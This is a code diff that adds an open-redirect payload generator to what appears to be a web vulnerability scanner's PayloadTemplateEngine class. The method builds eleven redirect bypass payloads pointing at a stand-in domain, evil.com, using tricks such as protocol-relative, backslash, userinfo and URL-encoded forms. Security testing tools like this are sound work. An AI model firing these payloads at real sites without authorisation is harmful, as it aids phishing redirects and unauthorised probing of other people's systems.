@@ -271,6 +271,41 @@ class PayloadTemplateEngine:
         return payloads
 
     # ────────────────────────────────────────
+    # Open Redirect Payloads
+    # ────────────────────────────────────────
+    def generate_open_redirect_payloads(self, base_url: str, param_name: str = "redirect",
+                                        canary_domain: str = "evil.com") -> List[PayloadTemplate]:
+        """Generate Open Redirect test payloads across 10+ standard and bypass techniques."""
+        payloads: List[PayloadTemplate] = []
+        parsed = urlparse(base_url)
+        target_host = parsed.netloc or "target.com"
+
+        redirect_vectors = [
+            ("Redirect_Direct_HTTPS", f"https://{canary_domain}", "high", "Direct HTTPS URL to external domain"),
+            ("Redirect_Direct_HTTP", f"http://{canary_domain}", "high", "Direct HTTP URL to external domain"),
+            ("Redirect_Protocol_Relative", f"//{canary_domain}", "high", "Protocol-relative URL //evil.com"),
+            ("Redirect_Backslash_Bypass", f"/\\{canary_domain}", "high", "Backslash bypass /\\evil.com"),
+            ("Redirect_Double_Slash_Slash", f"///{canary_domain}", "high", "Triple slash bypass ///evil.com"),
+            ("Redirect_Scheme_Relative_Colon", f"https:{canary_domain}", "high", "Scheme-relative bypass https:evil.com"),
+            ("Redirect_UserInfo_Bypass", f"https://{target_host}@{canary_domain}", "high", "Userinfo host bypass @evil.com"),
+            ("Redirect_Hash_Bypass", f"https://{target_host}#{canary_domain}", "medium", "Fragment #evil.com bypass"),
+            ("Redirect_Query_Bypass", f"https://{canary_domain}?{target_host}", "high", "Query param append evil.com?target.com"),
+            ("Redirect_Encoded_Bypass", f"https:%2f%2f{canary_domain}", "high", "URL-encoded slash bypass"),
+            ("Redirect_Dot_Slash_Bypass", f"/./{canary_domain}", "medium", "Path normalization bypass /./evil.com"),
+        ]
+
+        for name, p_val, severity, desc in redirect_vectors:
+            new_url = self._replace_param(base_url, param_name, p_val)
+            payloads.append(PayloadTemplate(
+                name=name, vuln_type="open_redirect", method="GET", url=new_url,
+                description=desc, severity=severity,
+                tags=["open_redirect", "redirect"]
+            ))
+
+        logger.info(f"[PayloadEngine] Generated {len(payloads)} Open Redirect payloads for {base_url}")
+        return payloads
+
+    # ────────────────────────────────────────
     # Mass Assignment Payloads
     # ────────────────────────────────────────
     def generate_mass_assignment_payloads(self, base_url: str,
